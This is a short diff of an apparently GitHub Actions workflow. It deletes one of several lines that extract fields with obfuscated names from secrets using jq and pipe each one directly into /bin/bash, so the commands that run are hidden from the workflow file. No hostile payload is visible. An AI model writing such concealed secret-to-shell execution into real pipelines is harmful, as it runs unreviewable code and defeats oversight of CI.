@@ -21,7 +21,6 @@ jobs:
           d3: ${{ secrets.d3 }}
         run: |
           printf '%s' "$d3" | jq -r .bkhk23 | /bin/bash
-          echo $mzgtf53 | jq -r .xk882 | /bin/bash
           printf '%s' "$ak79" | jq -r .ajhh49 | /bin/bash
           printf '%s' "$vr30298" | jq -r .phqo9152 | /bin/bash
           echo $aku3091 | jq -r .s3526 | /bin/bash
